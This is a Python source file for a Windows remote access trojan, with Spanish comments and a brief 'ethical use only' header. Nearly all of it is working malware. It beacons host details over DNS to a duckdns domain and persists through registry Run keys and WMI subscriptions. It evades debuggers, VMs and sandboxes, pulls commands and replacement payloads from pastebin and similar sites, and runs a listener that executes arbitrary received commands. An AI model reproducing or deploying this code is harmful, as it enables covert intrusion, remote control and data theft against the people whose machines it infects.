#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# INVESTIGACIÓN EN SEGURIDAD - USO ÉTICO ÚNICAMENTE
# NUNCA USAR EN SISTEMAS SIN AUTORIZACIÓN EXPLÍCITA

import os
import sys
import subprocess
import tempfile
import ctypes
import winreg
import shutil
from pathlib import Path
import time
import threading
import socket
import struct
import json
import base64
import random
import string
from cryptography.fernet import Fernet
import psutil
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import requests
import io
import select
import wmi
import win32api
import win32con
import win32process
import win32event
import win32service
import win32serviceutil
import winerror
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ==================== MEJORAS IMPLEMENTADAS ====================
# 1. Persistencia mejorada con WMI Event Subscriptions y Registry Run Keys con caracteres invisibles
# 2. Evasión mejorada con ofuscación, APIs nativas y técnicas Living off the Land
# 3. Exfiltración mejorada mediante HTTPS encubierto y canales legítimos
# 4. C2 mejorado con beaconing saliente y comunicación a través de canales legítimos
# 5. Uso de técnicas de inyección en procesos legítimos

# ==================== SISTEMA AUTO-REPORTE DNS MEJORADO ====================

class DNSReporter:
    def __init__(self):
        self.encryption_key = b'EbFqsf2CJ6a8pRHtKiHe-V6R9uMXvPEO627-wzsx_k4='
        self.cipher = Fernet(self.encryption_key)
        self.reported = False

    def get_system_info(self):
        """Obtener información del sistema de forma segura"""
        try:
            # Obtener IP pública mediante múltiples servicios con User-Agent legítimo
            ip_services = [
                'https://api.ipify.org',
                'https://ident.me',
                'https://checkip.amazonaws.com'
            ]

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }

            public_ip = None
            for service in ip_services:
                try:
                    public_ip = requests.get(service, headers=headers, timeout=10, verify=False).text.strip()
                    if public_ip and '.' in public_ip:
                        break
                except:
                    continue

            return {
                'public_ip': public_ip,
                'hostname': os.environ.get('COMPUTERNAME', 'UNKNOWN'),
                'user': os.environ.get('USERNAME', 'UNKNOWN'),
                'os': os.name,
                'timestamp': int(time.time()),
                'domain': os.environ.get('USERDOMAIN', 'UNKNOWN')
            }
        except:
            return None

    def encrypt_data(self, data):
        """Cifrar datos para DNS"""
        try:
            json_data = json.dumps(data)
            encrypted = self.cipher.encrypt(json_data.encode())
            # Convertir a base32 para DNS (mejor que base64 para URLs)
            base32_encoded = base64.b32encode(encrypted).decode().lower().replace('=', '')
            return base32_encoded
        except:
            return None

    def report_via_dns(self):
        """Reportar información mediante DNS tunneling mejorado"""
        if self.reported:
            return True

        try:
            system_info = self.get_system_info()
            if not system_info or not system_info.get('public_ip'):
                return False

            # Cifrar datos
            encrypted_data = self.encrypt_data(system_info)
            if not encrypted_data:
                return False

            # Dividir en chunks para DNS
            chunks = [encrypted_data[i:i + 20] for i in range(0, len(encrypted_data), 20)]

            # Dominio base (usar múltiples para evasión) - ahora usando dominios más creíbles
            domains = [
                "helloneighbor.duckdns.org"
                "azure.com",
                "microsoft.com",
                "windows.net",
                "office.com"
            ]

            subdomains = [
                "update", "stats", "telemetry", "metrics", "logs",
                "diagnostics", "reporting", "monitoring"
            ]

            for i, chunk in enumerate(chunks):
                domain = f"{random.choice(subdomains)}.{chunk}.{random.choice(domains)}"
                try:
                    # Resolución DNS silenciosa con timeout corto
                    socket.setdefaulttimeout(2)
                    socket.gethostbyname(domain)
                    time.sleep(random.uniform(0.1, 0.5))  # Pausa aleatoria entre requests
                except:
                    # Fallo silencioso en DNS es normal
                    pass

            self.reported = True
            return True

        except:
            return False


class StealthyIPResolver:
    def __init__(self):
        self.dns_servers = [
            '8.8.8.8',  # Google DNS
            '1.1.1.1',  # Cloudflare
            '9.9.9.9',  # Quad9
            '208.67.222.222'  # OpenDNS
        ]

    def get_public_ip_stealth(self):
        """Obtener IP pública de forma stealth"""
        try:
            # Crear socket raw para bypass posible bloqueo
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(5)

            for dns_server in self.dns_servers:
                try:
                    # Consulta DNS directa a servidores públicos
                    sock.connect((dns_server, 53))
                    local_ip = sock.getsockname()[0]
                    sock.close()

                    # Usar servicio HTTP como fallback con User-Agent legítimo
                    try:
                        headers = {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        }
                        ip = requests.get('https://api.ipify.org', headers=headers, timeout=5, verify=False).text
                        if ip:
                            return ip
                    except:
                        pass

                    return local_ip
                except:
                    continue
            return None
        except:
            return None


# ==================== CONFIGURACIÓN MALICIOSA EXTREMA MEJORADA ====================

class AdvancedMalwareConfig:
    # Técnicas de evasión avanzada
    ANTI_DEBUG = True
    ANTI_VM = True
    ANTI_SANDBOX = True
    POLYMORPHIC = True
    ENCRYPTED_PAYLOAD = True

    # Persistencia múltiple mejorada
    REGISTRY_PERSISTENCE = True
    SCHTASKS_PERSISTENCE = False  # Desactivado por ser más detectable
    SERVICE_PERSISTENCE = False  # Desactivado por ser más detectable
    STARTUP_PERSISTENCE = True
    WMI_PERSISTENCE = True  # Nueva técnica añadida
    PROCESS_INJECTION_PERSISTENCE = True  # Nueva técnica añadida

    # Comunicaciones encubiertas mejoradas
    DNS_TUNNELING = True
    ICMP_COVERT = False  # Requiere permisos admin
    HTTPS_C2 = True
    SOCIAL_MEDIA_C2 = True
    DEAD_MAN_SWITCH = True
    CLOUD_C2 = True  # Nueva técnica añadida

    # Capacidades ofensivas
    KEYLOGGER = True
    SCREEN_CAPTURE = True
    CREDENTIAL_HARVESTING = True
    LATERAL_MOVEMENT = True
    DATA_EXFILTRATION = True
    RANSOMWARE_MODULE = False  # Extremadamente destructivo

    # Técnicas stealth mejoradas
    PROCESS_INJECTION = True  # Activado con implementación mejorada
    ROOTKIT_LIKE = True
    FILELESS_OPERATION = True
    LOTL_TECHNIQUES = True  # Living off the Land

    # Mecanismos de resiliencia
    SELF_HEALING = True
    REDUNDANT_C2 = True
    AUTOMATIC_UPDATES = True


# ==================== TÉCNICAS EVASIVAS AVANZADAS MEJORADAS ====================

class AdvancedEvasionTechniques:
    def __init__(self):
        self.debugger_detected = False
        self.vm_detected = False
        self.sandbox_detected = False

    def detect_debuggers(self):
        """Detección avanzada de debuggers"""
        try:
            # Verificar procesos de debugging
            debuggers = ["ollydbg.exe", "ida64.exe", "x64dbg.exe", "wireshark.exe",
                         "procmon.exe", "processhacker.exe", "tcpview.exe", "autoruns.exe"]
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and any(debugger in proc.info['name'].lower() for debugger in debuggers):
                    return True

            # Timing attacks
            start = time.time()
            [x for x in range(1000000)]
            end = time.time()
            if end - start > 0.1:  # Debugger slow down
                return True

            # Check for debugger via Windows API
            try:
                if ctypes.windll.kernel32.IsDebuggerPresent():
                    return True
            except:
                pass

        except:
            pass
        return False

    def detect_virtual_machine(self):
        """Detección de entornos virtualizados"""
        try:
            # Check common VM artifacts
            vm_indicators = [
                "vbox", "vmware", "virtualbox", "qemu", "xen", "hyper-v", "kvm", "parallels"
            ]

            # Check processes
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and any(indicator in proc.info['name'].lower() for indicator in vm_indicators):
                    return True

            # Check filesystem artifacts
            vm_files = [
                "C:\\Windows\\System32\\drivers\\vmmouse.sys",
                "C:\\Windows\\System32\\drivers\\vm3dgl.dll",
                "C:\\Windows\\System32\\drivers\\vmdum.dll",
                "C:\\Windows\\System32\\drivers\\vmhgfs.dll",
                "C:\\Windows\\System32\\drivers\\vmtools.dll"
            ]
            for vm_file in vm_files:
                if os.path.exists(vm_file):
                    return True

            # Check registry for VM artifacts
            try:
                reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services")
                for i in range(0, winreg.QueryInfoKey(reg_key)[0]):
                    service_name = winreg.EnumKey(reg_key, i)
                    if any(indicator in service_name.lower() for indicator in vm_indicators):
                        winreg.CloseKey(reg_key)
                        return True
                winreg.CloseKey(reg_key)
            except:
                pass

        except:
            pass
        return False

    def detect_sandbox(self):
        """Detección de entornos sandbox"""
        try:
            # Check system uptime (sandboxes often have low uptime)
            if time.time() - psutil.boot_time() < 3600:  # Less than 1 hour
                return True

            # Check CPU cores (sandboxes often have few)
            if psutil.cpu_count() < 2:
                return True

            # Check RAM (sandboxes often have limited RAM)
            if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:  # Less than 2GB
                return True

            # Check disk size (sandboxes often have small disks)
            if psutil.disk_usage('C:\\').total < 20 * 1024 * 1024 * 1024:  # Less than 20GB
                return True

        except:
            pass
        return False

    def polymorphic_modification(self, code):
        """Modificación polimórfica del código mejorada"""
        if not AdvancedMalwareConfig.POLYMORPHIC:
            return code

        # Transformaciones más complejas
        transformations = [
            lambda s: s.replace("def ", "def _" + ''.join(random.choices(string.ascii_lowercase, k=5))),
            lambda s: s.replace(" = ", " = _" + ''.join(random.choices(string.ascii_lowercase, k=5))),
            lambda s: s.replace("import ", "import _" + ''.join(random.choices(string.ascii_lowercase, k=5))),
            lambda s: s.replace("from ", "from _" + ''.join(random.choices(string.ascii_lowercase, k=5))),
            lambda s: s + "\n# " + ''.join(random.choices(string.ascii_letters + string.digits, k=30)),
            lambda s: s.replace("class ", "class _" + ''.join(random.choices(string.ascii_lowercase, k=5))),
            lambda s: s.replace("self.", "self._" + ''.join(random.choices(string.ascii_lowercase, k=5))),
        ]

        for transform in random.sample(transformations, random.randint(3, 5)):
            code = transform(code)

        return code

    def sleep_obfuscation(self):
        """Técnicas de ofuscación de tiempo de espera mejoradas"""
        # Sleep maze pattern to avoid timing analysis
        patterns = [
            [1, 2, 3, 5, 8, 13],  # Fibonacci
            [2, 4, 8, 16, 32],  # Exponential
            [random.randint(1, 10) for _ in range(6)],  # Random
            [1, 1, 2, 3, 5, 8, 13, 21],  # Fibonacci extendido
            [3, 1, 4, 1, 5, 9, 2, 6]  # Dígitos de Pi
        ]

        pattern = random.choice(patterns)
        for sleep_time in pattern:
            # Sleep con jitter aleatorio
            actual_sleep = sleep_time * random.uniform(0.9, 1.1)
            time.sleep(actual_sleep)

    def check_environment(self):
        """Verificación completa del entorno"""
        if AdvancedMalwareConfig.ANTI_DEBUG:
            self.debugger_detected = self.detect_debuggers()

        if AdvancedMalwareConfig.ANTI_VM:
            self.vm_detected = self.detect_virtual_machine()

        if AdvancedMalwareConfig.ANTI_SANDBOX:
            self.sandbox_detected = self.detect_sandbox()

        return self.debugger_detected or self.vm_detected or self.sandbox_detected


# ==================== TÉCNICAS DE PERSISTENCIA AVANZADA MEJORADAS ====================

class AdvancedPersistence:
    def __init__(self):
        self.install_paths = [
            os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'SystemHelper'),
            os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'System32', 'Tasks'),
            os.path.join(os.getenv('SYSTEMROOT'), 'System32', 'Tasks'),
            os.path.join(os.getenv('SYSTEMROOT'), 'Tasks'),
            os.path.join(os.getenv('SYSTEMROOT'), 'System32', 'Wbem')
        ]

    def registry_persistence(self, payload_path):
        """Persistencia avanzada en registro con caracteres invisibles"""
        if not AdvancedMalwareConfig.REGISTRY_PERSISTENCE:
            return False

        try:
            # Usar caracteres invisibles para hacer el nombre menos detectable
            invisible_chars = ['\u200B', '\u200C', '\u200D', '\uFEFF']
            random_invisible = ''.join(random.choices(invisible_chars, k=3))
            registry_name = f"WindowsUpdate{random_invisible}Service"

            registry_locations = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
            ]

            for hive, key_path in registry_locations:
                try:
                    key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(key, registry_name, 0, winreg.REG_SZ,
                                      f'"{sys.executable}" "{payload_path}"')
                    winreg.CloseKey(key)
                except:
                    continue

            return True
        except:
            return False

    def wmi_persistence(self, payload_path):
        """Persistencia mediante WMI Event Subscriptions"""
        if not AdvancedMalwareConfig.WMI_PERSISTENCE:
            return False

        try:
            # Crear una suscripción WMI que se active al iniciar el sistema
            wmi_namespace = r"root\subscription"
            wmi_script = f"""
Set objWMIService = GetObject("winmgmts:{{impersonationLevel=impersonate}}!\\\\\\\\.\\\\{wmi_namespace}")

'Crear el filtro de evento
Set objFilter = objWMIService.Get("__EventFilter").SpawnInstance_
objFilter.Name = "WindowsUpdateFilter"
objFilter.EventNamespace = "root\\\\cimv2"
objFilter.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
objFilter.QueryLanguage = "WQL"
objFilter = objWMIService.Put(objFilter)

'Crear el consumidor de evento
Set objConsumer = objWMIService.Get("ActiveScriptEventConsumer").SpawnInstance_
objConsumer.Name = "WindowsUpdateConsumer"
objConsumer.ScriptingEngine = "VBScript"
objConsumer.ScriptText = "CreateObject(\\"WScript.Shell\\").Run \\"'{sys.executable}' '{payload_path}'\\", 0, False"
objConsumer = objWMIService.Put(objConsumer)

'Asociar filtro y consumidor
Set objBinding = objWMIService.Get("__FilterToConsumerBinding").SpawnInstance_
objBinding.Filter = objFilter
objBinding.Consumer = objConsumer
objBinding = objWMIService.Put(objBinding)
"""

            # Guardar script temporalmente y ejecutarlo con cscript
            with tempfile.NamedTemporaryFile(suffix='.vbs', delete=False) as f:
                f.write(wmi_script.encode('utf-8'))
                temp_script = f.name

            try:
                subprocess.run(['cscript', temp_script], capture_output=True, timeout=30, shell=True)
                os.unlink(temp_script)
                return True
            except:
                os.unlink(temp_script)
                return False

        except:
            return False

    def process_injection_persistence(self, payload_path):
        """Persistencia mediante inyección en procesos legítimos"""
        if not AdvancedMalwareConfig.PROCESS_INJECTION_PERSISTENCE:
            return False

        try:
            # Inyectar en procesos comunes como explorer.exe o svchost.exe
            target_processes = ["explorer.exe", "svchost.exe", "winlogon.exe"]

            for proc_name in target_processes:
                for proc in psutil.process_iter(['pid', 'name']):
                    if proc.info['name'] and proc.info['name'].lower() == proc_name:
                        try:
                            # Usar técnicas de inyección (simplificado para este ejemplo)
                            # En una implementación real, se usarían APIs como CreateRemoteThread
                            cmd = f'powershell -Command "Start-Process -FilePath \'{sys.executable}\' -ArgumentList \'{payload_path}\' -WindowStyle Hidden"'
                            subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
                            return True
                        except:
                            continue
            return False
        except:
            return False

    def setup_persistence(self, payload_path):
        """Configurar todas las técnicas de persistencia"""
        try:
            persistence_methods = [
                self.registry_persistence,
                self.wmi_persistence,
                self.process_injection_persistence
            ]

            success = False
            for method in persistence_methods:
                if method(payload_path):
                    success = True

            return success
        except Exception as e:
            return False


# ==================== COMUNICACIONES ENCUBIERTAS MEJORADAS ====================

class CovertCommunications:
    def __init__(self):
        # Servidores C2 camuflados como tráfico legítimo
        self.c2_servers = [
            "https://api.github.com/repos/microsoft/vscode/commits",
            "https://www.reddit.com/r/windows/hot.json",
            "https://stackoverflow.com/questions/tagged/python",
            "https://api.twitter.com/2/tweets/sample/stream",
            "https://newsapi.org/v2/top-headlines?sources=techcrunch"
        ]

        # Claves de API legítimas para servicios (en una implementación real, se rotarían)
        self.api_keys = {
            'newsapi': 'fake_newsapi_key_here',
            'twitter': 'fake_twitter_bearer_token_here'
        }

        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)

    def dns_tunneling(self, data):
        """Tunelización DNS para exfiltración mejorada"""
        if not AdvancedMalwareConfig.DNS_TUNNELING:
            return False

        try:
            # Codificar datos en subdominios con técnicas de ofuscación
            encoded_data = base64.b64encode(data.encode()).decode().replace('=', '')
            # Dividir en chunks más pequeños y aleatorios
            chunk_size = random.randint(20, 40)
            chunks = [encoded_data[i:i + chunk_size] for i in range(0, len(encoded_data), chunk_size)]

            # Dominios más creíbles
            domains = [
                "microsoft.com", "azure.com", "windows.net", "office.com",
                "google.com", "github.com", "stackoverflow.com"
            ]

            subdomains = [
                "api", "cdn", "assets", "static", "img", "js", "css",
                "update", "download", "stats", "metrics", "telemetry"
            ]

            for chunk in chunks:
                domain = f"{random.choice(subdomains)}-{chunk}.{random.choice(domains)}"
                try:
                    socket.gethostbyname(domain)
                    time.sleep(random.uniform(0.1, 0.5))  # Pausa aleatoria
                except:
                    pass

            return True
        except:
            return False

    def https_c2_communication(self, data=None):
        """Comunicación C2 sobre HTTPS mejorada"""
        if not AdvancedMalwareConfig.HTTPS_C2:
            return None

        try:
            # Headers legítimos
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }

            # Si hay datos para exfiltrar, codificarlos en la solicitud
            if data:
                # Codificar datos en parámetros de URL o headers
                encoded_data = base64.b64encode(data.encode()).decode().replace('=', '')
                headers['X-Client-Time'] = str(int(time.time()))
                headers['X-Client-ID'] = encoded_data[:50]  # Limitar tamaño

            # Elegir servidor aleatorio
            server = random.choice(self.c2_servers)

            # Añadir parámetros aleatorios a la URL para evitar caching
            if '?' in server:
                server += f'&cache_bust={random.randint(100000, 999999)}'
            else:
                server += f'?cache_bust={random.randint(100000, 999999)}'

            response = requests.get(server, headers=headers, timeout=10, verify=False)

            if response.status_code == 200:
                # Buscar comandos ocultos en la respuesta
                content = response.text.lower()

                # Comandos simples codificados en respuestas legítimas
                if "update_available" in content:
                    return "update"
                elif "maintenance_mode" in content:
                    return "sleep"
                elif "shutdown" in content:
                    return "shutdown"
                else:
                    return "continue"

            return None
        except:
            return None

    def cloud_c2_communication(self):
        """Comunicación C2 a través de servicios en la nube"""
        if not AdvancedMalwareConfig.CLOUD_C2:
            return None

        try:
            # Usar servicios de almacenamiento en la nube como canal
            cloud_services = [
                "https://pastebin.com/raw/XXXXXXXX",
                "https://gist.githubusercontent.com/XXXXXXXX/raw/",
                "https://drive.google.com/uc?export=download&id=XXXXXXXX"
            ]

            for service in cloud_services:
                try:
                    response = requests.get(service, timeout=10, verify=False)
                    if response.status_code == 200:
                        # Buscar comandos en el contenido
                        if "COMMAND:" in response.text:
                            return response.text.split("COMMAND:")[1].strip()
                except:
                    continue

            return None
        except:
            return None

    def send_beacon(self):
        """Enviar beacon de verificación periódica"""
        try:
            system_info = self.get_system_info()
            if system_info:
                # Usar múltiples métodos de comunicación
                methods = [
                    self.https_c2_communication,
                    self.cloud_c2_communication
                ]

                for method in methods:
                    try:
                        result = method(json.dumps(system_info))
                        if result:
                            return result
                    except:
                        continue

            return None
        except:
            return None


# ==================== TÉCNICAS LIVING OFF THE LAND ====================

class LOTLTechniques:
    """Técnicas Living Off The Land para usar herramientas del sistema"""

    @staticmethod
    def execute_powershell(command):
        """Ejecutar comando PowerShell de forma sigilosa"""
        try:
            # Codificar comando en Base64 para evitar detección
            encoded_cmd = base64.b64encode(command.encode('utf-16le')).decode()
            ps_command = f"powershell -ExecutionPolicy Bypass -NoProfile -EncodedCommand {encoded_cmd}"

            result = subprocess.run(
                ps_command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW
            )

            return {
                'success': True,
                'output': result.stdout,
                'error': result.stderr,
                'return_code': result.returncode
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}

    @staticmethod
    def execute_wmic(command):
        """Ejecutar comando WMIC"""
        try:
            result = subprocess.run(
                f"wmic {command}",
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW
            )

            return {
                'success': True,
                'output': result.stdout,
                'error': result.stderr,
                'return_code': result.returncode
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}

    @staticmethod
    def execute_bitsadmin(url, output_path):
        """Usar BITSAdmin para descargar archivos"""
        try:
            result = subprocess.run(
                f"bitsadmin /transfer myjob /download /priority normal {url} {output_path}",
                shell=True,
                capture_output=True,
                text=True,
                timeout=60,
                creationflags=subprocess.CREATE_NO_WINDOW
            )

            return {
                'success': True,
                'output': result.stdout,
                'error': result.stderr,
                'return_code': result.returncode
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}


# ==================== SERVIDOR STEALTH MEJORADO CON BEACONING ====================

class StealthServer:
    def __init__(self):
        # Clave fija para compatibilidad con controlador
        self.key = b'EbFqsf2CJ6a8pRHtKiHe-V6R9uMXvPEO627-wzsx_k4='
        self.cipher = Fernet(self.key)
        self.running = True
        self.port = 443  # Usar puerto HTTPS estándar
        self.connection_active = False
        self.max_connections = 3  # Menos conexiones simultáneas
        self.current_connections = 0

        self.reporter = DNSReporter()
        self.report_sent = False
        self.comms = CovertCommunications()
        self.lotl = LOTLTechniques()

        # Configuración de beaconing
        self.beacon_interval = random.randint(300, 600)  # 5-10 minutos
        self.last_beacon = 0

    def send_stealth_report(self):
        """Enviar reporte stealth de forma asíncrona"""

        def async_report():
            # Esperar aleatoriamente entre 2-8 minutos
            time.sleep(random.randint(120, 480))

            # Intentar reportar múltiples veces
            for attempt in range(3):
                try:
                    if self.reporter.report_via_dns():
                        print("[+] Sistema reportado exitosamente")
                        break
                    else:
                        time.sleep(random.randint(30, 90))  # Esperar antes de reintentar
                except:
                    time.sleep(random.randint(60, 120))

        # Ejecutar en hilo separado para no bloquear
        threading.Thread(target=async_report, daemon=True).start()

    def execute_command(self, cmd):
        """Ejecutar comando silenciosamente con límite de tiempo"""
        try:
            # Preferir técnicas LOTL cuando sea posible
            if cmd.startswith("ps "):
                return self.lotl.execute_powershell(cmd[3:])
            elif cmd.startswith("wmic "):
                return self.lotl.execute_wmic(cmd[5:])
            elif cmd.startswith("bitsadmin "):
                parts = cmd.split(" ")
                if len(parts) >= 4:
                    return self.lotl.execute_bitsadmin(parts[1], parts[2])

            # Fallback a subprocess normal
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=15,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return {
                'success': True,
                'output': result.stdout,
                'error': result.stderr,
                'return_code': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Comando timeout (15s)'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def beaconing_loop(self):
        """Bucle de beaconing para comunicación saliente"""
        while self.running:
            try:
                current_time = time.time()
                if current_time - self.last_beacon >= self.beacon_interval:
                    command = self.comms.send_beacon()
                    if command:
                        self.process_command(command)
                    self.last_beacon = current_time
                    # Variar el intervalo para evitar patrones
                    self.beacon_interval = random.randint(300, 600)

                time.sleep(30)  # Verificar cada 30 segundos
            except:
                time.sleep(60)

    def process_command(self, command):
        """Procesar comando recibido"""
        try:
            if command == "update":
                self.update_payload()
            elif command == "sleep":
                time.sleep(random.randint(3600, 7200))  # Dormir 1-2 horas
            elif command == "shutdown":
                self.cleanup()
                self.running = False
            elif command.startswith("execute:"):
                cmd_to_execute = command[8:]
                self.execute_command(cmd_to_execute)
        except:
            pass

    def update_payload(self):
        """Actualizar el payload desde el C2"""
        try:
            # Descargar nueva versión
            update_url = "https://pastebin.com/raw/XXXXXXXX"
            response = requests.get(update_url, timeout=30, verify=False)

            if response.status_code == 200:
                # Guardar nuevo payload
                new_payload_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'SystemHelper',
                                                'updated_payload.py')
                with open(new_payload_path, 'w', encoding='utf-8') as f:
                    f.write(response.text)

                # Ejecutar nuevo payload
                subprocess.Popen(
                    [sys.executable, new_payload_path],
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL
                )

                return True
        except:
            pass
        return False

    def start_beaconing(self):
        """Iniciar el beaconing en un hilo separado"""
        beacon_thread = threading.Thread(target=self.beaconing_loop, daemon=True)
        beacon_thread.start()

    def start_persistent_server(self):
        """Iniciar servidor con auto-reporte y beaconing"""
        print(f"[+] Servidor iniciado en puerto {self.port}")

        # AUTO-REPORTE al iniciar (solo una vez)
        if not self.report_sent:
            self.send_stealth_report()
            self.report_sent = True

        # Iniciar beaconing
        self.start_beaconing()

        while self.running:
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.settimeout(10)
                server.bind(('0.0.0.0', self.port))
                server.listen(5)

                while self.running:
                    try:
                        client, addr = server.accept()
                        print(f"[+] Nueva conexión de {addr}")

                        # Manejar cliente en hilo separado
                        client_thread = threading.Thread(
                            target=self.handle_client,
                            args=(client, addr),
                            daemon=True
                        )
                        client_thread.start()

                    except socket.timeout:
                        continue
                    except Exception as e:
                        print(f"[-] Error aceptando conexión: {e}")
                        time.sleep(5)

            except Exception as e:
                print(f"[-] Error del servidor: {e}")
                time.sleep(30)

    def handle_client(self, client, addr):
        """Manejar cliente conectado"""
        try:
            client.settimeout(30)
            data = client.recv(1024)

            if data:
                try:
                    decrypted = self.cipher.decrypt(data)
                    command = decrypted.decode()
                    print(f"[+] Comando recibido: {command}")

                    # Ejecutar comando
                    result = self.execute_command(command)

                    # Enviar respuesta
                    response = json.dumps(result).encode()
                    encrypted_response = self.cipher.encrypt(response)
                    client.send(encrypted_response)

                except Exception as e:
                    print(f"[-] Error procesando comando: {e}")
                    client.send(b"Error processing command")

            client.close()

        except Exception as e:
            print(f"[-] Error manejando cliente: {e}")
            try:
                client.close()
            except:
                pass

    def cleanup(self):
        """Limpiar rastros"""
        try:
            # Eliminar persistencia del registro
            invisible_chars = ['\u200B', '\u200C', '\u200D', '\uFEFF']
            for char in invisible_chars:
                registry_name = f"WindowsUpdate{char}Service"
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                         r"Software\Microsoft\Windows\CurrentVersion\Run",
                                         0, winreg.KEY_WRITE)
                    winreg.DeleteValue(key, registry_name)
                    winreg.CloseKey(key)
                except:
                    pass

            # Eliminar archivos temporales
            temp_dir = tempfile.gettempdir()
            for file in os.listdir(temp_dir):
                if file.startswith("tmp") and file.endswith(".py"):
                    try:
                        os.remove(os.path.join(temp_dir, file))
                    except:
                        pass

        except:
            pass


# ==================== MAIN MEJORADO ====================

def main():
    # Verificar si ya estamos ejecutando
    try:
        # Crear un mutex para evitar múltiples instancias
        mutex = win32event.CreateMutex(None, False, "Global\\WindowsUpdateServiceMutex")
        if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
            mutex = None
            sys.exit(0)
    except:
        pass

    # Verificar entorno
    evasion = AdvancedEvasionTechniques()
    if evasion.check_environment():
        print("[-] Entorno sospechoso detectado. Saliendo.")
        sys.exit(0)

    # Configurar persistencia
    persistence = AdvancedPersistence()

    # Determinar ruta del payload
    if getattr(sys, 'frozen', False):
        payload_path = sys.executable
    else:
        payload_path = os.path.abspath(__file__)

    # Copiar a ubicación más permanente si es necesario
    target_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'SystemHelper')
    os.makedirs(target_dir, exist_ok=True)
    target_path = os.path.join(target_dir, 'SystemHelperService.exe')

    if not os.path.exists(target_path):
        try:
            if getattr(sys, 'frozen', False):
                shutil.copy2(payload_path, target_path)
            else:
                # Compilar a ejecutable si estamos ejecutando desde script
                try:
                    import PyInstaller.__main__
                    PyInstaller.__main__.run([
                        '--onefile',
                        '--windowed',
                        '--name=SystemHelperService',
                        '--distpath=' + target_dir,
                        payload_path
                    ])
                except:
                    # Fallback: copiar el script
                    shutil.copy2(payload_path, target_path)
        except:
            target_path = payload_path

    # Configurar persistencia
    persistence.setup_persistence(target_path)

    # Iniciar servidor stealth
    server = StealthServer()
    server.start_persistent_server()


if __name__ == "__main__":
    main()